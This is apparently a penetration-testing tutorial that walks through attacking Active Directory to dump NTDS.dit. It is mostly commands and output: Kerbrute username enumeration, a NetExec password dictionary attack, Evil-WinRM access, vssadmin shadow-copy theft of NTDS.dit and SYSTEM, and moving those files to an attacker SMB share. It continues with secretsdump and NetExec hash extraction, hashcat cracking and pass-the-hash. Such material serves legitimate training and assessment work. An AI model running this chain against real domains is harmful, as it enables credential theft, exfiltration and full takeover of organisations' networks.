# Attacking Active Directory and NTDS.dit

Attacking Active Directory and extracting credentials from NTDS.dit represents one of the most impactful attacks possible in an enterprise environment. A successful NTDS.dit dump gives an attacker the NT hash of every single account in the domain — users, computers, service accounts, and the krbtgt account itself — making full domain compromise an immediate consequence.

## How Domain Authentication Changes the Attack Surface

Once a Windows system is joined to a domain, it no longer validates logon requests against its local SAM database by default. Authentication requests are forwarded to a Domain Controller (DC) for validation against [NTDS.dit](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). The local SAM database still exists and can still be used — a user can authenticate locally by specifying the hostname before their username (e.g., `WS01\localuser`) or by typing `.\` in the logon UI — but domain accounts are exclusively managed by the DC. This distinction matters for targeting decisions during an assessment, as the two attack surfaces require different approaches.

The NTDS.dit attack chain is documented under [MITRE ATT&CK T1003.003](https://attack.mitre.org/techniques/T1003/003/).

## Phase 1: Building a Username List

Before attempting any authentication against the domain, a valid username list needs to be assembled. Common organizational username naming conventions include:

| Convention | Example for Jane Jill Doe |
|---|---|
| `firstinitiallastname` | `jdoe` |
| `firstinitialmiddleinitiallastname` | `jjdoe` |
| `firstnamelastname` | `janedoe` |
| `firstname.lastname` | `jane.doe` |
| `lastname.firstname` | `doe.jane` |

OSINT sources for names include LinkedIn, the company website's staff directory, and Google dorks such as `"@inlanefreight.com" filetype:pdf` which may expose usernames embedded in PDF metadata from documents generated by design tools.

Once names are collected, [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) automates the generation of common username permutations from a list of real names:

```bash
./username-anarchy -i /home/user/names.txt

bwilliamson
ben.williamson
williamson.ben
bburgerstien
bob.burgerstien
jstevenson
jim.stevenson
jdoe
jane.doe
doe.jane
```

## Phase 2: Validating Usernames with Kerbrute

Before spraying passwords, it is worth confirming which usernames actually exist in the domain. [Kerbrute](https://github.com/ropnop/kerbrute) leverages Kerberos pre-authentication to validate usernames without triggering account lockout, since failed pre-auth requests for nonexistent accounts produce a different error code than failed authentication attempts:

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

2025/04/25 09:17:11 >  [+] VALID USERNAME: bwilliamson@inlanefreight.local
```

Username enumeration via Kerberos does not increment the bad password counter, making this a relatively low-noise operation compared to SMB-based enumeration.

## Phase 3: Dictionary Attack with NetExec

With a validated username list, a dictionary attack can be launched over SMB using NetExec. The `fasttrack.txt` wordlist is a good starting point as it targets commonly used enterprise passwords:

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB  10.129.201.57  445  DC01  [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE
SMB  10.129.201.57  445  DC01  [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE
SMB  10.129.201.57  445  DC01  [+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

> **Lockout Warning:** A default Windows domain [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)) does not enforce account lockout, but many organizations configure one. Always confirm the lockout threshold before launching a dictionary attack — locking out accounts during a production engagement can cause significant operational disruption and may terminate the assessment.

Every failed logon attempt generates **Windows Event ID 4625** (Account Logon Failure) on the DC. A sudden burst of 4625 events against a single username from a single source IP is a reliable indicator of a dictionary attack, so this technique should be considered noisy.

## Phase 4: Connecting to the DC with Evil-WinRM

With valid credentials in hand, [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) provides a PowerShell remoting session to the DC over WinRM (port 5985):

```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Before attempting to capture NTDS.dit, verify that the compromised account has sufficient privileges — Domain Admin or local Administrator rights on the DC are required. Both can be confirmed quickly:

```cmd
# Check local group memberships on the DC
net localgroup

# Check the user's domain group memberships
net user bwilliamson

Global Group memberships     *Domain Users    *Domain Admins
```

## Phase 5: Capturing NTDS.dit via VSS

NTDS.dit is located at `%SystemRoot%\NTDS\ntds.dit` and is held open by the AD DS service at all times — it cannot be copied directly. [Volume Shadow Copy Service (VSS)](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) creates a point-in-time snapshot of the volume that can be read while the original file remains locked:

```powershell
# Step 1: Create a shadow copy of C:
vssadmin CREATE SHADOW /For=C:

Successfully created shadow copy for 'C:\'
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# Step 2: Copy NTDS.dit out of the shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit

# Step 3: Also copy the SYSTEM hive (required for decryption)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\NTDS\SYSTEM

# Step 4: Move files to attack host SMB share
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
cmd.exe /c move C:\NTDS\SYSTEM \\10.10.15.30\CompData
```

Just as with the SAM database, NTDS.dit hashes are encrypted with the boot key stored in the SYSTEM registry hive. Both files are required for successful decryption.

## Phase 6: Extracting Hashes

### Method A: Offline with secretsdump

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
```

secretsdump also extracts Kerberos AES-256 and AES-128 keys alongside the NT hashes, which are useful for Kerberos-based attacks that require encryption keys rather than NT hashes.

### Method B: Remote one-liner with NetExec

NetExec's `-M ntdsutil` module automates the entire VSS snapshot, copy, and extraction chain in a single command:

```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

NTDSUTIL  10.129.201.57  445  DC01  [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL  10.129.201.57  445  DC01  [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL  10.129.201.57  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL  10.129.201.57  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL  10.129.201.57  445  DC01  [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds
```

To extract only enabled accounts from the output file:

```bash
grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

## Phase 7: Cracking or Using the Hashes

### Cracking with Hashcat

NT hashes extracted from NTDS.dit are cracked the same way as SAM hashes using mode `1000`:

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

### Pass-the-Hash (PtH)

When cracking fails or is unnecessary, NT hashes can be used directly for authentication via the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) without ever knowing the plaintext password. Evil-WinRM supports PtH natively with the `-H` flag:

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

PtH works because NTLM authentication relies on the hash itself as the credential — the server issues a challenge, the client responds using the hash to compute an HMAC-MD5 response, and no plaintext is required at any point. This makes it a powerful lateral movement technique across any environment relying on NTLM authentication.

## Full Attack Chain Reference

| Phase | Goal | Tool |
|---|---|---|
| 1 | Generate username candidates | Username Anarchy, manual OSINT |
| 2 | Validate usernames | `kerbrute userenum` |
| 3 | Dictionary attack | `netexec smb -u <user> -p <wordlist>` |
| 4 | Remote access to DC | `evil-winrm` |
| 5 | Capture NTDS.dit | `vssadmin` + `copy` or `netexec -M ntdsutil` |
| 6 | Extract hashes | `impacket-secretsdump LOCAL` |
| 7a | Recover plaintext | `hashcat -m 1000` |
| 7b | Authenticate without cracking | `evil-winrm -H <NT hash>` (Pass-the-Hash) |
